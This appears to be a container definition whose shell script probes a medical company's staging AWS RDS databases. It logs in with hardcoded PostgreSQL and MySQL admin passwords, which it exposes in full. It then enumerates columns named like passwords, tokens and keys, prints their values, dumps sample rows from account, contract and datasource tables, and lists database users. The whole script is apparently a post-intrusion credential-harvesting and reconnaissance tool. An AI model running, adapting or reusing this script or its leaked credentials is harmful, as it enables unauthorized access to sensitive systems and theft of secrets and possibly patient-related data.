containers.name: probe
args:
#!/bin/sh
set -u
echo "===I3550R3_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client mariadb-client curl jq >/tmp/apk.log 2>&1
echo "apk=$? psql=$(command -v psql||echo none) mysql=$(command -v mysql||echo none)"
curl -s -m 15 http://ip-api.com/json/ | head -c 200; echo
G='password|passwd|secret|token|api[_-]?key|apikey|credential|AKIA|ASIA|Bearer|PRIVATE KEY|mysql://|postgres://|redis://'

P(){ PGPASSWORD="$1" psql "host=$2 port=5432 user=postgres_admin dbname=dp_service sslmode=require connect_timeout=20" -At -F'|' -c "$3" 2>&1; }
P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select version();" | head -2
echo "PG_COLHITS:"; P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select table_schema||'.'||table_name||'.'||column_name from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and column_name ~* 'pass|pwd|secret|token|api_?key|credential|access_?key|private' order by 1 limit 100" | head -60
for C in $(P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select table_schema||'.'||table_name||'.'||column_name from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and column_name ~* 'pass|pwd|secret|token|api_?key|credential|access_?key|private' order by 1 limit 30" | grep -v ERROR); do
  T=$(echo "$C"|cut -d. -f1,2); COL=$(echo "$C"|cut -d. -f3)
  CN=$(P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select count(*) from $T where $COL is not null" 2>/dev/null)
  echo "COL $C nonnull=$CN"
  [ "$CN" = "0" ] && continue
  P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select left($COL::text,180) from $T where $COL is not null limit 5" 2>/dev/null | head -5
done
for T in public.datasource public.sync_inbox public.project public.metadata_template public.modality public.dicom_tag public.contract public.site; do
  CN=$(P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select count(*) from $T" 2>/dev/null)
  echo "TBL $T rows=$CN"
  [ "$CN" = "0" ] && continue
  P kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com "select left(row_to_json(t)::text,420) from (select * from $T limit 3) t" 2>/dev/null | head -3
done
echo "ML_TRANSPORT_RETRY"
PGPASSWORD='oOG3+4KkUopBF#Uw' psql "host=lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com port=5432 user=postgres_admin dbname=mlflow_service sslmode=disable connect_timeout=20" -At -c "select version(), current_user;" 2>&1 | head -3
PGPASSWORD='oOG3+4KkUopBF#Uw' psql "host=lazamedical-dp-stage01-usw2-postgresql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com port=5432 user=postgres_admin dbname=mlflow_service sslmode=require connect_timeout=20" -At -c "select version(), current_user;" 2>&1 | head -2

M(){ MYSQL_PWD="$1" mysql --connect-timeout=20 -h "$2" -P 3306 -u "$3" -D "$4" -N -B -e "$5" 2>&1; }
echo "MY_COLHITS:"; M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select table_name,column_name from information_schema.columns where table_schema='user_management' and column_name regexp 'pass|pwd|secret|token|api_?key|credential|access_?key|private' order by 1 limit 100" | head -60
for C in $(M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select concat(table_name,'.',column_name) from information_schema.columns where table_schema='user_management' and column_name regexp 'pass|pwd|secret|token|api_?key|credential|access_?key|private' order by 1 limit 30" | grep -v ERROR); do
  T=$(echo "$C"|cut -d. -f1); COL=$(echo "$C"|cut -d. -f2)
  CN=$(M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select count(*) from \`$T\` where \`$COL\` is not null" | head -1)
  echo "COL $C nonnull=$CN"
done
for T in account api_endpoint module platform component role language data_processing_status account_type; do
  CN=$(M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select count(*) from \`$T\`" | head -1)
  echo "TBL $T rows=$CN"
  [ "$CN" = "0" ] && continue
  M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select * from \`$T\` limit 3" | cut -c1-350 | head -3
done
echo "MY_USERS: $(M ':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;' lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com admin user_management "select user,host from mysql.user limit 20" | tr '
' ' ' | cut -c1-300)"
echo "===I3550R3_DONE $(date -u +%FT%TZ)==="
